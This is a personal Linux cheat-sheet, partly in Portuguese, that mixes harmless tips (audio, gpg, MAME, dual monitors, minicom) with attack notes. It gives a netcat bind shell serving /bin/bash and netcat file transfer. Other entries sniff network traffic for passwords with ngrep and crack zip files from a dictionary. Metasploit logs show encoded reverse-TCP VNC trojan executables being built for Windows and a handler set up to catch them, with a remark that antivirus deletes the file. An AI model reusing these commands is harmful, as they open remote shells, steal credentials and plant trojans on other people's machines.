
#######################################################################
# by  epgielow@gmail.com
# workrounds with bunsenlads linux lightweight distro
# not a script.  .sh just to sintax highlight
######################################################################

#Audio problem
mplayer -ao alsa:device=hw 0.0  file.avi

ALSA utility to find your HW
aplay -l

----------------------------------------------------------------------

# problem to poweroff the system - bunsenlabs linux
# systemctl reboot -f  ( poweroff/halt options ) 

----------------------------------------------------------------------


#who to crito files with gpg

#gpg -e -a file   ( fsaida file.asc) 
#gpg --list-keys
#gpg -d   ( passfrase)

#HACK
Criar um chat undeground com netcat
#nc -lvp 2222    ( srv )
#nc ip 2222  (cli)

#crypt o chat
#gpg -ac  enter, senha 2x
digita o txt a ser cifrado
Ctr+D
copia o txt cifrado e envia!

#descriptografar
gpg -d  (colar o txt cifrado ) + senha 
ctr+D para visualizar o conteudo.
-----------------------------------------------------------------------

#Shell remoto
#nc -lvp 2222 -e /bin/bash 
#nc ip_srv 2222  ( chama o shell remoto)

#transferir arquivos via nc
nc -lvp 5555 > file.xxx (srv)
nv ip_srv 5555 < fileUpload.yyy (client)
> recebe;  <  envia.
-----------------------------------------------------------------------

#IRC UNDERNET

/msg x@channels.undernet.org login yourlogin passw
#bookz  UFOs  
#MaStErHaCk

/mode youlogin +x  ( esconder ip ) 
#############################################
ngrep -q -W byline "GET|POST HTTP"

ngrep -q -W byline teste.net upd port 53

ngrep -q -K 1 -i password tcp -O pcap.out
o

#fcrackzip  -v -D -u -p dicionatio.txt file.zip


#systemctl reboot -f   poweroff/halt options

#MAME
mame -sound none -autoframeskip -keepaspect -resolution 640x480 robocop.zip

#VIDEO DUAL MONITOR
xrandr --output LVDS-0 --auto --output  VGA-0 --mode 1440x900 --pos 1440x0


#NESSUS
Copyright (C) 1998 - 2016 Tenable Network Security, Inc

Processing the Nessus plugins...
[##################################################]

All plugins loaded (2sec)

 - You can start Nessus by typing /etc/init.d/nessusd start
 - Then go to https://BlackStar:8834/ to configure your scanner


###################################################################################################
##### METASPLOIT
#######################################################
prec@BlackStar:~$ msfconsole 
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v4.11.15-dev-05897f59dfc6edd9d0535dbee8ba5c0c5df2356d]
+ -- --=[ 1523 exploits - 887 auxiliary - 260 post        ]
+ -- --=[ 436 payloads - 38 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp

PAYLOAD => linux/x86/meterpreter/reverse_tcp
msf exploit(handler) > 
msf exploit(handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf exploit(handler) > set LPORT 2222
LPORT => 2222
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   DebugOptions  0                no        Debugging options for POSIX meterpreter
   LHOST         127.0.0.1        yes       The listen address
   LPORT         2222             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > exploit
--------------------------------------------------
#criar payloads e executaveis 

tprec@BlackStar:~$ msfvenom -p windows/vncinject/reverse_tcp LHOST=10.5.26.236 LPORT=2222 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe-only > calcTroja2.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai succeeded with size 387 (iteration=1)
x86/shikata_ga_nai succeeded with size 414 (iteration=2)
x86/shikata_ga_nai chosen with final size 414
Payload size: 414 bytes
tprec@BlackStar:~$ file calcTroja2.exe 
calcTroja2.exe: data
OBS: Desse moto nao estah executando no windows
--------------------------------------------------------------

#assim consegui trojanar o exe do windows:
prec@BlackStar:~$ msfconsole 

msf > use payload/windows/vncinject/reverse_tcp
msf payload(reverse_tcp) > set LHOST 10.5.26.236
LHOST => 10.5.26.236
msf payload(reverse_tcp) > set LPORT 2222
LPORT => 2222
msf payload(reverse_tcp) > generate -i 10 -t exe -f vncBug.exe 
[*] Writing 73802 bytes to vncBug.exe...
msf payload(reverse_tcp) > quit

 file vncBug.exe 
vncBug.exe: PE32 executable (GUI) Intel 80386, for MS Windows
Funcionou dessa modo gerar o exe. O AV do windows apaga sumariamente o arquivo trojanado!


msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/vncinject/reverse_tcp
PAYLOAD => windows/vncinject/reverse_tcp
msf exploit(handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf exploit(handler) > set LPORT 2222
LPORT => 2222
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > exploit -j
[*] Exploit running as background job.

[*] Started reverse TCP handler on 127.0.0.1:2222 
msf exploit(handler) > 
[*] Starting the payload handler...

-------------------------------------------------------------------------------------------
SITE:
mundodoshacker.blogspot.com.br  
#faraday IDE pen test - github 


#SERIAL MINICOM

#dmesg |grep tty
#minicom -D /dev/ttyUSB0 -b 9600 
#minicom -s

--------------------------------------------------------------------------------------------
